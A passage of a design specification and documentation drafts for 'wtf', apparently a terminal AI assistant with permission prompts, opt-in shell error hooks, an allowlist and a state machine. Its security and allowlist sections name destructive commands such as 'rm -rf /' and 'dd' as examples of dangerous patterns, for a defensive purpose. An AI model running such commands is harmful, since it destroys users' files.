  ✗ express not installed

💭 Analysis: You have npm/node but express isn't installed yet.

I'll install express for your Node.js project.

╭─────────────────────────────────────────────╮
│ $ npm install express                      │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]
```

### 8.4 Shell Integration (Optional Auto-Triggers)

**NOT enabled by default.** Users can optionally set up shell hooks to automatically invoke wtf when errors occur.

These hooks can be set up independently - you might want error auto-trigger but not command-not-found, or vice versa.

#### Setup

```bash
# Set up error auto-trigger
wtf --setup-error-hook

# Set up command-not-found auto-trigger
wtf --setup-not-found-hook

# Or set up both by running both commands
```

These add hooks to your shell configuration (`~/.zshrc` or `~/.bashrc`) that automatically trigger wtf in two scenarios:

1. **Command exits with error** (non-zero exit code)
2. **Command not found** errors

#### How It Works

**1. Error Auto-Trigger (Non-zero Exit Code)**

When a command fails, automatically run `wtf "I hit an error"`:

**Zsh implementation** (added to `~/.zshrc`):
```zsh
# wtf auto-trigger on error
precmd() {
    local exit_code=$?
    if [[ $exit_code -ne 0 ]] && [[ -n "$WTF_AUTO_ON_ERROR" ]]; then
        echo "\n⚠️  Command failed with exit code $exit_code"
        wtf "I hit an error"
    fi
}

# Enable/disable via environment variable
export WTF_AUTO_ON_ERROR=1  # Set to 0 to temporarily disable
```

**Bash implementation** (added to `~/.bashrc`):
```bash
# wtf auto-trigger on error
wtf_check_error() {
    local exit_code=$?
    if [[ $exit_code -ne 0 ]] && [[ -n "$WTF_AUTO_ON_ERROR" ]]; then
        echo -e "\n⚠️  Command failed with exit code $exit_code"
        wtf "I hit an error"
    fi
}
PROMPT_COMMAND="wtf_check_error"

export WTF_AUTO_ON_ERROR=1
```

**2. Command Not Found Auto-Trigger**

When a command is not found, automatically run `wtf "command not found: {cmd}"`.

Both zsh and bash pass the unknown command name as the first argument to the handler, allowing us to include it in the wtf query.

**Zsh implementation** (added to `~/.zshrc`):
```zsh
# wtf auto-trigger on command not found
command_not_found_handler() {
    local cmd=$1  # First argument is the command that wasn't found
    echo "Command not found: $cmd"
    if [[ -n "$WTF_AUTO_ON_NOT_FOUND" ]]; then
        wtf "command not found: $cmd"
    fi
    return 127
}

export WTF_AUTO_ON_NOT_FOUND=1
```

**Bash implementation** (added to `~/.bashrc`):
```bash
# wtf auto-trigger on command not found
command_not_found_handle() {
    local cmd=$1  # First argument is the command that wasn't found
    echo "Command not found: $cmd"
    if [[ -n "$WTF_AUTO_ON_NOT_FOUND" ]]; then
        wtf "command not found: $cmd"
    fi
    return 127
}

export WTF_AUTO_ON_NOT_FOUND=1
```

#### User Control

Users can enable/disable auto-triggers via environment variables:

```bash
# Disable error auto-trigger temporarily
export WTF_AUTO_ON_ERROR=0

# Disable command-not-found auto-trigger
export WTF_AUTO_ON_NOT_FOUND=0

# Re-enable
export WTF_AUTO_ON_ERROR=1
export WTF_AUTO_ON_NOT_FOUND=1
```

Or add to `~/.zshrc` / `~/.bashrc` for permanent changes.

#### Removal

```bash
wtf --remove-hooks
```

This removes the hook code from shell configuration files.

#### What the Agent Sees

**On error auto-trigger:**
- User query: `"I hit an error"`
- Recent shell history includes the failed command
- Agent can see the command and ask to re-run it to see error output
- Agent helps debug based on the error

**On command not found:**
- User query: `"command not found: {cmd}"` (command name is included!)
- The `{cmd}` is passed from the handler's `$1` argument
- Agent receives the exact command that wasn't found
- Agent can suggest:
  - Correct command spelling (e.g., "kubeectl" → "kubectl")
  - Installation instructions
  - Alternative commands
  - Check if command is aliased

#### Important Notes

- **Not enabled by default** - users must opt-in
- **Hooks are independent** - set up only error hook, only not-found hook, or both
- Can be noisy if many commands fail - use environment variables to disable temporarily
- Agent still follows normal permission flow for running commands
- Works alongside manual `wtf` invocations
- Shell history context helps agent understand what went wrong
- Recommended: Start with `--setup-not-found-hook` (less noisy than error hook)

#### Example Flow

```bash
# User runs a command that fails
$ npm run biuld
npm error Missing script: "biuld"

⚠️  Command failed with exit code 1

# wtf auto-triggered with query "I hit an error"
Checking recent commands...

I see you tried to run 'npm run biuld', but it failed because there's
no script named 'biuld' in your package.json.

Did you mean 'npm run build'?

# Agent can continue helping...
```

```bash
# User tries to run a command that doesn't exist
$ kubeectl get pods
Command not found: kubeectl

# wtf auto-triggered with "command not found: kubeectl"
You tried to run 'kubeectl', which doesn't exist.

Did you mean 'kubectl'? If kubectl isn't installed, I can help you
install it.
```

## 9. Error Handling & Recovery

### 9.1 Command Execution Timeouts

**Default timeout:** 30 seconds (configurable)

```python
COMMAND_TIMEOUT = 30  # seconds

def execute_command(cmd: str, timeout: int = COMMAND_TIMEOUT) -> tuple[str, int]:
    """Execute command with timeout."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return (result.stdout + result.stderr, result.returncode)
    except subprocess.TimeoutExpired:
        return ("⏱️  Command timed out after {timeout}s", -1)
```

**User Experience:**

```bash
$ wtf "backup my database"

╭─────────────────────────────────────────────╮
│ $ pg_dump mydb > backup.sql                │
╰─────────────────────────────────────────────╯

Run this command? [Y/n] y

⏱️  Command timed out after 30s

The database backup is taking longer than expected. This might be normal for 
large databases.

Options:
  1. Wait longer: wtf "backup database with longer timeout"
  2. Run in background: wtf "backup database in background"
  3. Check database size first: wtf "how big is my database"
```

**Configurable:**

```json
{
  "execution": {
    "default_timeout": 30,
    "max_timeout": 300,
    "background_threshold": 60  // Commands expected to take >60s suggest background
  }
}
```

### 9.2 API Errors

**Rate Limiting:**

```bash
$ wtf "fix this error"

⏳ Rate limit exceeded (resets in 3m 24s)

The API rate limit was hit. This usually happens when you're using wtf 
frequently within a short time.

Options while you wait:
  • Check your recent conversation: Just look up in your terminal
  • Use a different model: wtf --model gpt-4 "fix this error"
  • Take a coffee break (seriously, you've earned it)

Or just wait 3 minutes. We'll retry automatically.
```

**Network Failures:**

```bash
$ wtf "help with this"

🌐 Connection failed

Can't reach the API. Either your internet is down, or the service is having issues.

What you can do:
  • Check your connection: ping 8.8.8.8
  • Use cached conversations: wtf "show my recent history"
  • Try again in a moment

wtf will retry automatically in 5 seconds...
```

**Retry with Exponential Backoff:**

```python
def query_ai_with_retry(prompt: str, max_retries: int = 3) -> str:
    """Query AI with retry logic."""
    for attempt in range(max_retries):
        try:
            return query_ai(prompt)
        except RateLimitError as e:
            wait_time = e.reset_in_seconds
            print(f"⏳ Rate limit hit. Waiting {wait_time}s...")
            time.sleep(wait_time)
        except NetworkError:
            if attempt < max_retries - 1:
                backoff = 2 ** attempt  # 1s, 2s, 4s
                print(f"🌐 Connection failed. Retrying in {backoff}s...")
                time.sleep(backoff)
            else:
                raise
```

**Invalid API Key:**

```bash
$ wtf "help"

❌ API key invalid or expired

Your API key for claude-3-5-sonnet isn't working.

Fix it:
  1. Check your key: wtf --config
  2. Get a new key: https://console.anthropic.com/settings/keys
  3. Or use a different provider: wtf --model gpt-4 "help"
```

### 9.3 Command Execution Errors

**Permission Denied:**

```bash
╭─────────────────────────────────────────────╮
│ $ ./deploy.sh                              │
╰─────────────────────────────────────────────╯

❌ Permission denied: ./deploy.sh

The script isn't executable. I can fix that.

╭─────────────────────────────────────────────╮
│ $ chmod +x deploy.sh                       │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]
```

**Command Not Found:**

```bash
╭─────────────────────────────────────────────╮
│ $ docker-compose up                        │
╰─────────────────────────────────────────────╯

❌ docker-compose: command not found

Docker Compose isn't installed. Want me to install it?

[Shows installation command for user's platform]
```

**Non-Zero Exit Code:**

The AI analyzes the error output and suggests fixes.

### 9.4 Configuration Errors

**Corrupt Config:**

```bash
$ wtf "help"

⚠️  Config file corrupted: ~/.config/wtf/config.json

Fix it:
  1. Reset to defaults: wtf --reset
  2. Edit manually: wtf --config
  3. Restore from backup: ~/.config/wtf/config.json.backup
```

**Missing Config:**

Auto-creates with defaults on first run.

### 9.5 Progress Indicators

**Light spinners for waiting:**

```python
from rich.spinner import Spinner
from rich.console import Console

console = Console()

# When gathering context
with console.status("🔍 Gathering context...") as status:
    history = get_shell_history()
    git_status = get_git_status()

# When querying AI  
with console.status("🤖 Thinking...") as status:
    response = query_ai(prompt)

# When executing long command
with console.status("⚙️  Running command...") as status:
    output = execute_command(cmd)
```

**Don't overdo it - keep it subtle:**
- ✅ Show spinner for operations > 1 second
- ❌ Don't show for instant operations (< 0.5s)
- ❌ Don't show progress bars (no way to know progress)
- ❌ Don't show "estimated time" (unreliable)

## 10. Security Considerations

### 10.1 Command Execution Safety

- Never execute commands without user consent (unless in allowlist)
- Warn for potentially dangerous commands (rm -rf, dd, etc.)
- Sandbox execution where possible
- Log all executed commands

### 10.2 API Key Storage

- Prefer environment variables over config file storage
- If stored in config, set file permissions to 600
- Never log or display API keys

### 10.3 Context Privacy

- Filter sensitive data from context (passwords, tokens)
- Allow users to exclude certain commands from history
- Provide option to disable history logging

## 11. Conversation State Machine (v0.1 - Core Feature)

**Why in v0.1:** Multi-step flows are core to wtf's value. Without proper state management, these become buggy and unreliable.

**The Problem:** wtf handles complex async flows:
- AI calls (can take seconds)
- Command execution (can timeout, fail, or succeed)
- User input (permission prompts)
- Multi-step operations (context gathering → AI → command → result → more AI)

Without explicit state management, this becomes spaghetti code.

**The Solution:** State machine with explicit states and transitions.

### 11.1 States

```python
from enum import Enum, auto

class ConversationState(Enum):
    """States in the wtf conversation flow."""
    
    INITIALIZING = auto()         # Gathering context (history, git, etc.)
    QUERYING_AI = auto()           # API call to AI provider
    STREAMING_RESPONSE = auto()    # Receiving streaming response
    AWAITING_PERMISSION = auto()   # User needs to approve command
    EXECUTING_COMMAND = auto()     # Running approved command
    PROCESSING_OUTPUT = auto()     # AI analyzing command output
    RESPONDING = auto()            # Showing final response
    COMPLETE = auto()              # Conversation finished
    ERROR = auto()                 # Error occurred
```

### 11.2 State Transitions

```
INITIALIZING → QUERYING_AI → STREAMING_RESPONSE
                                    ├─→ AWAITING_PERMISSION → EXECUTING_COMMAND → RESPONDING
                                    └─→ RESPONDING (no commands needed)
                                    
EXECUTING_COMMAND → PROCESSING_OUTPUT → QUERYING_AI (loop for multi-step)
                  → RESPONDING (done)

Any state → ERROR (on failure)
ERROR → RESPONDING (after handling)
```

### 11.3 Implementation

```python
from dataclasses import dataclass
from typing import Optional, List, Dict

@dataclass
class ConversationContext:
    """Context maintained throughout conversation."""
    user_query: str
    cwd: str
    shell_history: List[str]
    git_status: Optional[str]
    ai_response: str = ""
    commands_to_run: List[Dict[str, str]] = None
    current_command_index: int = 0

class ConversationStateMachine:
    """Manages conversation flow with explicit state transitions."""
    
    def __init__(self, context: ConversationContext):
        self.state = ConversationState.INITIALIZING
        self.context = context
        self.error: Optional[Exception] = None
    
    def run(self) -> str:
        """Execute the conversation state machine."""
        while self.state != ConversationState.COMPLETE:
            try:
                self._execute_current_state()
            except Exception as e:
                self.error = e
                self.state = ConversationState.ERROR
                return self._handle_error()
        
        return self.context.ai_response
    
    def _execute_current_state(self):
        """Execute logic for current state and transition."""
        
        if self.state == ConversationState.INITIALIZING:
            self._gather_context()
            self.state = ConversationState.QUERYING_AI
        
        elif self.state == ConversationState.QUERYING_AI:
            self._query_ai()
            self.state = ConversationState.STREAMING_RESPONSE
        
        elif self.state == ConversationState.STREAMING_RESPONSE:
            next_action = self._stream_response()
            
            if next_action == "needs_command":
                self.state = ConversationState.AWAITING_PERMISSION
            elif next_action == "complete":
                self.state = ConversationState.RESPONDING
        
        elif self.state == ConversationState.AWAITING_PERMISSION:
            permission = self._request_permission()
            
            if permission == "approved":
                self.state = ConversationState.EXECUTING_COMMAND
            elif permission == "rejected":
                self.state = ConversationState.RESPONDING
        
        elif self.state == ConversationState.EXECUTING_COMMAND:
            self._execute_command()
            
            # Check if AI needs to process output and continue
            if self._should_continue():
                self.state = ConversationState.PROCESSING_OUTPUT
            else:
                self.state = ConversationState.RESPONDING
        
        elif self.state == ConversationState.PROCESSING_OUTPUT:
            # AI analyzes command output and decides next step
            self.state = ConversationState.QUERYING_AI  # Loop back for multi-step
        
        elif self.state == ConversationState.RESPONDING:
            self._show_final_response()
            self.state = ConversationState.COMPLETE
```

### 11.4 Benefits

1. **Testability:** Each state can be tested independently
2. **Debuggability:** Always know exactly where we are
3. **Resumability:** Can save state and resume later (future feature)
4. **Clarity:** Makes complex flow easier to understand
5. **Extensibility:** Easy to add new states/transitions

### 11.5 Usage

```python
# Main CLI entry point
def main(user_query: str):
    context = ConversationContext(
        user_query=user_query,
        cwd=os.getcwd(),
        shell_history=get_shell_history(),
        git_status=get_git_status(),
    )
    
    state_machine = ConversationStateMachine(context)
    result = state_machine.run()
    
    print(result)
```

**This is v0.1, not v0.2.** Multi-step flows are core to wtf's value proposition.

## 12. Testing Strategy

### 12.1 Unit Tests

- Configuration loading/saving
- History parsing (zsh/bash formats)
- Command allowlist matching
- Context gathering
- State machine transitions

### 12.2 Integration Tests

- Full command execution flow
- API provider integration (mocked)
- Shell history reading
- Conversation continuity
- State machine with mocked AI responses

### 12.3 E2E Tests

- Complete user flows
- Installation process
- First-run configuration
- Command execution with permission prompts
- Multi-step operations

## 12. Documentation

### 12.1 Documentation Tool: MkDocs with Material Theme

**Tool Selection:** MkDocs with Material for MkDocs theme

**Rationale:**
- Python-based (aligns with project stack)
- Clean, modern UI
- Built-in search
- Mobile responsive
- GitHub Pages integration
- Fast static site generation
- Markdown-based (easy to maintain)

**Installation:**
```bash
pip install mkdocs-material
```

**Project Structure:**
```
wtf-terminal-ai/
├── docs/
│   ├── index.md                 # Home page (advertising + docs)
│   ├── getting-started.md       # Installation & setup
│   ├── usage.md                 # Basic usage guide
│   ├── configuration.md         # Config file reference
│   ├── memory-system.md         # How memories work
│   ├── allowlist.md             # Allowlist patterns guide
│   ├── shell-integration.md     # Auto-triggers & hooks
│   ├── troubleshooting.md       # Common issues
│   ├── security.md              # Security considerations
│   ├── api-providers.md         # Supported AI providers
│   ├── examples.md              # Real-world examples
│   ├── comparison.md            # vs. other tools
│   ├── acknowledgments.md       # Credits and influences
│   └── contributing.md          # Development guide
├── mkdocs.yml                   # MkDocs configuration
└── README.md                    # GitHub README
```

### 12.2 MkDocs Configuration (mkdocs.yml)

```yaml
site_name: wtf
site_description: Because working in the terminal often gets you asking wtf
site_author: wtf contributors
repo_url: https://github.com/username/wtf-terminal-ai
repo_name: wtf-terminal-ai

theme:
  name: material
  palette:
    # Light mode
    - scheme: default
      primary: deep orange
      accent: amber
      toggle:
        icon: material/brightness-7
        name: Switch to dark mode
    # Dark mode
    - scheme: slate
      primary: deep orange
      accent: amber
      toggle:
        icon: material/brightness-4
        name: Switch to light mode
  features:
    - navigation.instant
    - navigation.tracking
    - navigation.tabs
    - navigation.sections
    - navigation.top
    - search.suggest
    - search.highlight
    - content.code.copy
    - content.code.annotate

plugins:
  - search
  - social  # Social cards for sharing

markdown_extensions:
  - pymdownx.highlight:
      anchor_linenums: true
  - pymdownx.inlinehilite
  - pymdownx.snippets
  - pymdownx.superfences
  - pymdownx.tabbed:
      alternate_style: true
  - admonition
  - pymdownx.details
  - pymdownx.emoji:
      emoji_index: !!python/name:material.extensions.emoji.twemoji
      emoji_generator: !!python/name:material.extensions.emoji.to_svg
  - attr_list
  - md_in_html

nav:
  - Home: index.md
  - Getting Started:
    - Installation: getting-started.md
    - First Run Setup: getting-started.md#first-run
    - Quick Tutorial: getting-started.md#tutorial
  - Usage:
    - Basic Commands: usage.md
    - Real-World Examples: examples.md
    - Shell Integration: shell-integration.md
  - Configuration:
    - Config File: configuration.md
    - Custom Instructions: configuration.md#custom-instructions
    - Memory System: memory-system.md
    - Allowlist Patterns: allowlist.md
  - Reference:
    - API Providers: api-providers.md
    - Security: security.md
    - Troubleshooting: troubleshooting.md
  - About:
    - FAQ: faq.md
    - Comparison: comparison.md
    - Acknowledgments: acknowledgments.md
  - Contributing: contributing.md

extra:
  social:
    - icon: fontawesome/brands/github
      link: https://github.com/username/wtf-terminal-ai
```

### 12.3 Documentation Style Guide (Gilfoyle/Marvin the paranoid android Personality)

**Tone & Voice:**
- Technically precise with dry, sardonic humor
- Helpful first, funny second
- Self-aware about the absurdity of terminal life
- Never condescending - "we're in this together" vibe
- Brief, pithy comments that land quickly

**Writing Guidelines:**

1. **Headers should be direct and occasionally wry:**
   ```markdown
   # Installation
   ## The Part Where You Actually Install This Thing
   ## Common Problems (Because Of Course There Are Some)
   ```

2. **Descriptions should be helpful with occasional dry commentary:**
   ```markdown
   The allowlist lets you mark commands as "always safe" so you're not
   prompted every single time you run `git status` for the 47th time today.
   ```

3. **Examples should show both success and common failures:**
   ```markdown
   ✓ Works: `git status`
   ✗ Doesn't work: Attempting to exit vim with your mind
   ```

4. **Tips and warnings in Gilfoyle/Marvin voice:**
   ```markdown
   !!! tip "Efficiency"
       Add frequently used commands to your allowlist. Future you will thank
       present you. Briefly. Then go back to questioning all life choices.

   !!! warning "Don't Do This"
       Never add `rm` to your allowlist without the `-i` flag. I mean, you
       *could*, but then you'd be the person who nuked their home directory
       because an AI hallucinated. Not a great look.
   ```

5. **Keep it brief - respect the user's time:**
   - Short paragraphs (2-3 sentences max)
   - Bullet points for lists
   - Code examples that are complete but minimal
   - No fluff or filler

### 12.4 Home Page Structure (docs/index.md)

The home page serves dual purpose: advertising landing page + documentation entry point.

**Structure:**
```markdown
# Because working in the terminal often gets you asking wtf

A terminal AI assistant that actually understands context. Dry wit included.

## What This Does

You're in your terminal. Something breaks. You type `wtf`. An AI looks at your
recent commands, figures out what went wrong, and fixes it. Optionally with
commentary about the absurdity of modern software development.

[Quick demo GIF showing error → wtf → fixed]

## Installation

```bash
pip install wtf-ai
```

That's it. Configuration happens on first run.

## The 30-Second Tour

**When something breaks:**
```bash
$ npm run biuld
npm error Missing script: "biuld"

$ wtf
I see you tried 'npm run biuld'. Close, but not quite.

╭─────────────────────────────────────────────╮
│ $ npm run build                            │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]
```

**When you're not sure what went wrong:**
```bash
$ git push
[... wall of error text ...]

$ wtf
Let me check your git status first.

✓ Checked git status

You're on a branch that doesn't exist on the remote yet. I'll set up
the upstream tracking.

╭─────────────────────────────────────────────╮
│ $ git push --set-upstream origin feature   │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]
```

**When you just need to know:**
```bash
$ wtf how do I undo my last commit but keep the changes?

╭─────────────────────────────────────────────╮
│ $ git reset --soft HEAD~1                  │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]

✓ Done. Your changes are back in staging. As if that commit never
  happened. Time is an illusion anyway.
```

## Key Features

### Context-Aware
Reads your shell history to understand what you're actually doing. Not just
generic StackOverflow answers.

### Safe by Default
Asks permission before running commands. Unless you mark them as "always allow."
Your terminal, your rules.

### Learns Your Preferences
Remembers that you use `emacs`, prefer `poetry` over `pip`, and always rebase
instead of merge. Tailors suggestions accordingly.

### Provider Agnostic
Works with Claude, GPT-4, or Gemini. Your API key, your choice.

### Personality Included
Helpful with a side of dry humor. Think Gilfoyle meets Marvin the Paranoid
Android. Never mean, occasionally amusing.

## How It Works

1. **You ask for help:** `wtf [your question]`
2. **It gathers context:** Recent commands, current directory, git status
3. **AI analyzes:** Understands the problem with full context
4. **Proposes solution:** Shows command it wants to run
5. **You approve:** Yes, always allow, or no
6. **It executes:** Runs the command, shows output
7. **It learns:** Remembers preferences for next time

## Privacy & Security

- All history stored locally in `~/.config/wtf/`
- You control what commands can auto-execute (allowlist)
- API keys via environment variables
- Sensitive data filtered before sending to AI
- Open source - audit it yourself

## Quick Links

- [Installation & Setup](getting-started.md)
- [Usage Guide](usage.md)
- [Configuration](configuration.md)
- [Examples](examples.md)
- [Troubleshooting](troubleshooting.md)

## Requirements

- Python 3.8+
- API key for Claude, GPT-4, or Gemini
- Shell: zsh or bash (more coming)
- Platform: macOS, Linux (Windows: WSL)

## Get Started

```bash
pip install wtf-ai
wtf  # First run starts setup wizard
```

---

Built with the understanding that terminals are simultaneously the most powerful
and most frustrating tools we use. Might as well have an AI to commiserate with.

## What Makes wtf Different

### 🧠 Actually Understands Context
Not just another ChatGPT wrapper. wtf reads your shell history, git status, and 
remembers your preferences. It knows you prefer `rebase` over `merge` and use 
`poetry` not `pip`.

### 💾 Learns Over Time  
Memory system tracks your tools, workflows, and preferences. The more you use it, 
the better it gets at helping you.

### 🛡️ Safe by Default
Permission system with allowlist patterns. Never auto-executes dangerous commands. 
You're in control, always.

### 🔒 Privacy Focused
All history stored locally in `~/.config/wtf/`. No cloud sync, no tracking. 
Your data stays on your machine.

### 🔌 Provider Agnostic
Works with Claude, GPT-4, or Gemini. Your API key, your choice.

## Inspired By

wtf stands on the shoulders of giants:

- **[tAI](https://github.com/terminalai/tAI)** - Command preview and permission UX
- **[GitHub Copilot CLI](https://githubnext.com/projects/copilot-cli)** - AI-powered command suggestions
- **[Aider](https://github.com/paul-gauthier/aider)** - Diff previews and interactive mode  
- **[Claude-Code](https://www.anthropic.com/)** - Reasoning traces and context inspection
- **[thefuck](https://github.com/nvbn/thefuck)** - Command correction patterns
- **[Simon Willison's llm](https://github.com/simonw/llm)** - AI provider abstraction

**Personality inspired by:**
- Gilfoyle (Silicon Valley) - Dry technical humor
- Marvin (Hitchhiker's Guide) - Existential AI assistant

**Protocol:**
- [MCP (Model Context Protocol)](https://modelcontextprotocol.io/) - Standardized AI context
```

### 12.5 README.md Structure

The GitHub README should be concise and direct users to full docs:

```markdown
# wtf

Because working in the terminal often gets you asking wtf.

A terminal AI assistant with context awareness and dry wit.

## Installation

```bash
pip install wtf-ai
```

## Quick Start

```bash
# When something breaks
$ npm run biuld
npm error Missing script: "biuld"

$ wtf
I see you tried 'npm run biuld'. Close, but not quite.

╭─────────────────────────────────────────────╮
│ $ npm run build                            │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]
```

## Features

- 🧠 **Context-aware**: Reads your shell history, git status, and project context
- 🛡️ **Safe by default**: Asks permission before running commands
- 📚 **Learns over time**: Remembers your tools, workflows, and preferences
- 🤖 **Provider-agnostic**: Works with Claude, GPT-4, or Gemini
- 🔒 **Privacy-focused**: All data stored locally, no cloud sync
- 😏 **Personality**: Gilfoyle meets Marvin (dry wit included)

## What Makes wtf Different

Unlike other AI terminal tools:
- **Conversation continuity** - Remembers context across sessions
- **Memory system** - Learns your preferences over time
- **Shell history integration** - Actually understands what you're doing
- **Privacy first** - Your data stays on your machine

## Documentation

Full documentation at [wtf.dev](https://wtf.dev) (or wherever you host it)

## Acknowledgments

Inspired by [tAI](https://github.com/terminalai/tAI), [Aider](https://github.com/paul-gauthier/aider), 
[GitHub Copilot CLI](https://githubnext.com/projects/copilot-cli), and [Claude-Code](https://www.anthropic.com/).

Built with [llm](https://github.com/simonw/llm) by Simon Willison.

## Requirements

- Python 3.8+
- API key for Claude, GPT-4, or Gemini
- Shell: zsh or bash

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md)

## License

MIT
```

### 12.6 Example Documentation Pages (Personality Examples)

**docs/troubleshooting.md excerpt:**
```markdown
# Troubleshooting

Because of course something isn't working perfectly. It never does.

## "Command Not Found: wtf"

### Problem
You installed `wtf` but your shell can't find it.

### Solution
Your PATH doesn't include Python's bin directory. Add this to your `~/.zshrc`:

```bash
export PATH="$HOME/.local/bin:$PATH"
```

Then reload: `source ~/.zshrc`

### Why This Happens
Python installs things in non-standard locations and assumes you'll figure it
out. You have now figured it out. Progress.

---

## "API Key Invalid"

### Problem
```
Error: Invalid API key
```

### Solution
Your API key is wrong, expired, or missing. Run:

```bash
wtf --config
```

And update the `api.key` field. Or set the environment variable:

```bash
export ANTHROPIC_API_KEY=your-key-here
```

### How to Get a New Key
- **Anthropic**: https://console.anthropic.com/settings/keys
- **OpenAI**: https://platform.openai.com/api-keys
- **Google**: https://aistudio.google.com/app/apikey

---

## "Too Many Requests / Rate Limited"

### Problem
```
Error: Rate limit exceeded
```

### Solution
You've hit the API provider's rate limit. Wait a few minutes. Make tea.
Contemplate existence. Then try again.

### Prevention
Set up rate limiting in config:

```json
{
  "behavior": {
    "max_requests_per_minute": 20
  }
}
```

Not implemented yet? Well, that's awkward. Feature request accepted.
```

**docs/allowlist.md excerpt:**
```markdown
# Allowlist Patterns

## What This Is

The allowlist lets you mark commands as "safe to auto-execute" so you're not
prompted every time. For commands you run 47 times a day. You know the ones.

## How Patterns Work

Patterns match command prefixes:

✅ **Good patterns:**
- `git status` - matches `git status`, `git status -v`, etc.
- `ls` - matches `ls`, `ls -la`, `ls /home`, etc.
- `npm run build` - matches `npm run build`, `npm run build --prod`, etc.

❌ **Bad patterns (too broad):**
- `git` - matches ALL git commands including `git rm -rf`
- `rm` - matches `rm` including `rm -rf /`
- `docker` - matches everything docker-related

## Safety Tips

!!! warning "Think Before You Add"
    The allowlist is powerful. With great power comes great responsibility to
    not nuke your filesystem because you were feeling lazy.

**Safe commands:**
- Read-only operations: `git status`, `ls`, `cat`, `grep`
- Specific git operations: `git commit`, `git push`, `git pull`
- Safe build commands: `npm run build`, `poetry install`

**Dangerous commands:**
- Destructive operations: `rm`, `mv`, `dd`
- Unrestricted tools: `git`, `docker`, `npm` (without subcommand)
- Anything with sudo

## Adding Patterns

When `wtf` asks to run a command, you see:

```
Run this command?
[Y]es | Yes and [a]lways allow 'git status' | [n]o
```

Press `a` to add the pattern (shown in quotes) to your allowlist.

The pattern is chosen by the AI based on the command. It's usually smart about
it. Usually.

## Editing Manually

```bash
wtf --edit-allowlist
```

Opens `~/.config/wtf/allowlist.json` in your editor.

```json
{
  "patterns": [
    "git status",
    "git log",
    "git diff",
    "ls",
    "cat"
  ]
}
```

Add or remove patterns as you see fit. It's your footgun. Er, tool.
```

**docs/faq.md:**
```markdown
# Frequently Asked Questions

The questions people actually ask, plus a few we made up.

---

## Does wtf do everything?!

It tries.


---

## Can wtf do {x}?

Try asking it.  It's an AI super powered question answering, taske execution tool.  Why are you still looking up things in help documentation like it's 2008? 

---

## What does 'wtf' stand for?

Like the question of what happens after we die, a lot of people claim to know the answer to this question, but the truth is - no one really knows.  Its a random combination of letters many of us just found ourselves smashing into our keyboards when we got frustrated.  

Some popular theories are:

	1.	Why That Failed
	2.	Whilt Thou Fix
	3.	Workflow Triage Facilitator
	4.	Wretched Terminal Futility
	5.	Why The Fiasco
	6.	What’s The Fault
	7.	Why Ted Kennedy
	8.	Wasn’t That Fantastic
	9.	Workload Troubleshooting Framework
	10.	Wandering Through Futility

Some are frustrated with this un-answer.  But we recommend that you attempt to find joy in the fact that because there is no answer you have the pleasure, adventure and freedom of choosing your own!

---

## Is wtf my friend?

Why don't you try asking it?

---

## Will wtf always be there for me?

Nothing is permanent. The heat death of the universe comes for us all.

But wtf is open source under the MIT License, which means:
- The code is public and will remain so
- You can fork it if the maintainers disappear
- You can fix bugs yourself
- You can run your own version
- It costs nothing

So while we can't promise eternal vigilance, we can promise that the source code
isn't going anywhere. That's as permanent as software gets.

---

## Does wtf send my data anywhere?

Yes.  We send it to whatever AI provider you configure (OpenAI, Anthropic, etc.).  Where do they send it and what do they do with it?  We don't claim to know.

wtf doesn't have its own servers or hardrives or anything anywere.  It has no where to send anything, and it really doesn't care wtf you're doing.

If AI providers bother you (they should), wtf works great with local run models as well.  We use [Simon Willison's llm](https://github.com/simonw/llm) under the hood - so whatever it supports wtf should.

---

## Can I use wtf with local/offline AI models?

Yes! The `llm` library supports local models through plugins, so wtf should work with
them out of the box.

**Install a local model plugin:**

```bash
# Ollama (recommended for local models)
llm install llm-ollama
ollama pull llama3.2

# GPT4All
llm install llm-gpt4all

# MLX (Apple Silicon)
llm install llm-mlx
```

**Then just use it:**

```bash
wtf --model llama3.2 "explain this error"
```

Or set it as your default in `~/.config/wtf/config.json`:

```json
{
  "ai": {
    "default_model": "llama3.2"
  }
}
```

**Note:** Local models are typically slower and less capable than cloud APIs, but they're:
- ✅ Free (no API costs)
- ✅ Private (no data leaves your machine)
- ✅ Work offline
- ❌ Slower to respond
- ❌ Generally less accurate than GPT-4/Claude

Since we're using `llm` as our AI backend, any model that works with `llm` should
work with wtf. No special code needed on our end - the `llm` library handles all
the plugin discovery and model routing automatically.

---


## Does wtf work on Windows?

It should work in WSL (Windows Subsystem for Linux) and Git Bash.

Native Windows Command Prompt support is... questionable. PowerShell might work
but hasn't been extensively tested.

Honestly, if you're using Windows, try WSL first. Your terminal life will 
improve in ways that have nothing to do with wtf.

---

## Can I contribute?

I don't know, CAN you?  Come back when you know proper grammar.

## May I contribute? 

Pretty soon all of this (and other) code will be just handled by an LLM.  wtf is 100% vibe coded so the main way to contribute is with ideas, bug reports, and feedback and feature requests that we can pipe to another AI.  

Check out the [Contributing Guide](contributing.md) for details.

Or just open an issue and yell at us. That works too.

---

## Who made this?

People who got tired of Googling the same error messages.

Full credits in [Acknowledgments](acknowledgments.md).

---

!!! tip "Have Another Question?"
    Open an issue on GitHub. Or just ask wtf itself:
    ```bash
    $ wtf how do I ask the maintainers a question?
    ```
    
    It'll probably tell you to open a GitHub issue. Because it's smart like that.
```

**docs/comparison.md excerpt:**
```markdown
# How wtf Compares

## vs. GitHub Copilot CLI

**What they do:** AI-powered git/gh command suggestions  
**What wtf does:** Full terminal assistant with context and execution

**Key differences:**
- ✅ wtf has conversation continuity
- ✅ wtf executes commands (Copilot just suggests)
- ✅ wtf has memory system

**Use wtf if:** You want an assistant for all terminal tasks, not just git

---

## vs. tAI (Terminal AI)

**What they do:** AI command execution with permissions  
**What wtf does:** Same foundation, plus conversation history and learning

**Key differences:**
- ✅ wtf remembers your preferences over time
- ✅ wtf has personality (Gilfoyle/Marvin)
- ✅ wtf plans MCP integration for broader context

**Credit:** tAI pioneered the permission UX that wtf uses. Their command preview
and permission system inspired our implementation.

---

## vs. Aider

**What they do:** AI pair programming in terminal  
**What wtf does:** Broader terminal assistance beyond coding

**Key differences:**
